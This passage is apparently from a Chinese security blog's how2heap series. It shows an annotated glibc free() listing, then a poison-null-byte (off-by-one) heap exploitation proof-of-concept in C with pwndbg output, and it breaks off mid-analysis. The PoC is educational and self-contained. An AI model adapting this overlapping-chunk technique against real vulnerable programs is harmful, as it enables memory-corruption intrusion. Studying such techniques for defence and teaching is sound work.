class="comment">//有关于fastbin的代码已省略，因为之前也说过......</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  #接下来的代码才是重头戏</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"> <span class="comment">//若待释放的chunk不由mmap进行分配</span></span><br><span class="line">    <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">    <span class="comment">//如果此程序是单线程，不会对main_arena加锁</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>; <span class="comment">//单线程执行：have_lock=true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex); <span class="comment">//多线程获得锁</span></span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size); <span class="comment">//获取p chunk相邻高地址的chunk地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))   <span class="comment">//安全性检查：p不能为top_chunk</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="keyword">char</span> *) nextchunk <span class="comment">//安全性检查：当前free的chunk的相邻下一个chunk不能超过arena的边界</span></span><br><span class="line">  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) <span class="comment">//获取nextchunk的PREV_INUSE标志位</span></span><br><span class="line">        <span class="comment">//如果标志位为0则说明p堆块处于free状态，会触发异常</span></span><br><span class="line">        <span class="comment">//或者说明我们伪造的堆块不成功（😁）</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk); <span class="comment">//获取nextchunk的大小（不包括三个标志位）</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">//检查nextchunk的大小是否正常</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">//默认清空堆块中user_data的内容</span></span><br><span class="line">      <span class="comment">//#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">    <span class="comment">/* consolidate backward */</span> <span class="comment">//向后合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//获取pchunk的PREV_INUSE标志位</span></span><br><span class="line">        <span class="comment">//如果标志位为0则说明p之前的堆块处于free状态（tcachebin、fastbin除外）</span></span><br><span class="line">        <span class="comment">//我们开始对p和前一个相邻的free chunk进行合并</span></span><br><span class="line">      prevsize = prev_size (p); <span class="comment">//获取p堆块的mchunk_prev_size</span></span><br><span class="line">        <span class="comment">//如果前一个堆块处于unsortedbin、smallbin、largebin则p的mchunk_prev_size置位</span></span><br><span class="line">        <span class="comment">//和之前的if (!prev_inuse(p))相照应</span></span><br><span class="line">        <span class="comment">//这里的prevsize指的是前一个堆块的大小</span></span><br><span class="line">      size += prevsize; <span class="comment">//size=size+prevsize</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));  <span class="comment">//p现在指向前一个堆块</span></span><br><span class="line">      unlink(av, p, bck, fwd); <span class="comment">//对前一个堆块进行unlink</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//检查p堆块是否和top_chunk相邻</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span> <span class="comment">//如果不和top_chunk相邻</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">        <span class="comment">//获取nextchunk的下一个紧邻的堆块的PREV_INUSE标志位</span></span><br><span class="line">        <span class="comment">//这个标志位代表着nextchunk的状态</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span> <span class="comment">//向前合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果nextchunk处于unsortedbin、smallbin、largebin中</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//对nextchunk进行unlink</span></span><br><span class="line">size += nextsize; <span class="comment">//size=size+nextsize</span></span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//将nextchunk的PREV_INUSE标志位置0</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span> <span class="comment">//将堆块放入到unsortedbin链表中，我们会在调用malloc函数时对其中的free chunk进行整理</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);  <span class="comment">//bck指向unsortedbin的main_arena</span></span><br><span class="line">        <span class="comment">//为了形容方便，我们使用左右这个概念来区分</span></span><br><span class="line">        <span class="comment">//unsortedbin</span></span><br><span class="line">        <span class="comment">//all: 0x555555757760 —▸ 0x555555758100 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757760 /* &#x27;`wuUUU&#x27; */</span></span><br><span class="line">        <span class="comment">//           左                  右</span></span><br><span class="line">      fwd = bck-&gt;fd;  <span class="comment">//fwd指向最左边的堆块</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd; <span class="comment">//设置p堆块的fd</span></span><br><span class="line">      p-&gt;bk = bck; <span class="comment">//设置p堆块的bk</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p; <span class="comment">//链入unsortedbin【1】:在最左边插入</span></span><br><span class="line">      fwd-&gt;bk = p; <span class="comment">//链入unsortedbin【2】</span></span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE); <span class="comment">//设置p的size</span></span><br><span class="line">      set_foot(p, size); <span class="comment">//设置相邻下一个堆块的mchunk_prev_size</span></span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//如果p堆块和top_chunk相邻</span></span><br><span class="line">      size += nextsize; <span class="comment">//步骤很简单，与top_chunk进行合并</span></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//现在p chunk已经和其他堆块合并完成</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">        <span class="comment">//如果合并之后的堆块大小大于FASTBIN_CONSOLIDATION_THRESHOLD(65536UL)</span></span><br><span class="line">        <span class="comment">//一般合并到top chunk都会执行这部分代码。</span></span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) <span class="comment">//判断fastbin中是否有free chunk</span></span><br><span class="line">malloc_consolidate(av); <span class="comment">//调用malloc_consolidate对fastbin free chunk进行合并</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123; <span class="comment">//在单线程中av总是指向main_arena</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">          <span class="comment">//主分配区，如果当前top_chunk大小大于heap的收缩阈值，就会调用systrim收缩heap</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">//非主分配区，收缩调用heap_trim收缩heap段</span></span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123; <span class="comment">//如果free chunk由mmap进行分配</span></span><br><span class="line">    munmap_chunk (p);<span class="comment">//调用munmap_chunk用来回收mmap分配的空间（堆块）。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(6)-poison_null_byte</title>
    <link href="https://cyberangel.cn/2021/04/28/how2heap(6)-poison_null_byte/"/>
    <id>https://cyberangel.cn/2021/04/28/how2heap(6)-poison_null_byte/</id>
    <published>2021-04-28T12:11:15.000Z</published>
    <updated>2021-07-04T09:57:12.172Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>poison_null_byte 和 off-by-one 本质都是相同的只是名字不同罢了，这里我们再结合 libc-2.27.so 和 free 源码再来仔细的看一下。这里再多说几句，poison_null_byte 的本质是 malloc 滥用向前合并和向后合并造成的，其最核心的东西是 mchunk_size 中的 PREV_INUSE 和 mchunk_prev_size。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>所有 glibc malloc 版本</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 18.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x500 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x500 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xa00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line"><span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// we set this location to 0xa00 since 0xa00 == (0xa11 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0xa00 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0xa00 == b+0x9f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line"><span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line"><span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0xc00</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xc00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line"><span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编译命令：gcc -g poison_null_byte.c -o poison_null_byte</p></blockquote><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x500 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x500 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br></pre></td></tr></table></figure><p>编译之后对 POC 源码的 36 行下断点然后开始调试，程序会执行完上述代码，结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">250</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000208a1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p/<span class="function">x <span class="title">malloc_usable_size</span><span class="params">(a)</span>  <span class="comment">//malloc使用的大小</span></span></span><br><span class="line"><span class="function">$2 </span>= <span class="number">0x508</span></span><br><span class="line">pwndbg&gt; p/x real_a_size</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x508</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><blockquote><p>malloc_usable_size(a) //malloc 使用的大小<br>这里不探讨这个函数，感兴趣可以在 malloc.c 中找到其源码</p></blockquote><p>这里调用 malloc 创建了对齐后大小为 0x511 的堆块，接下来执行下述代码(b 47-&gt;c)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xa00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span 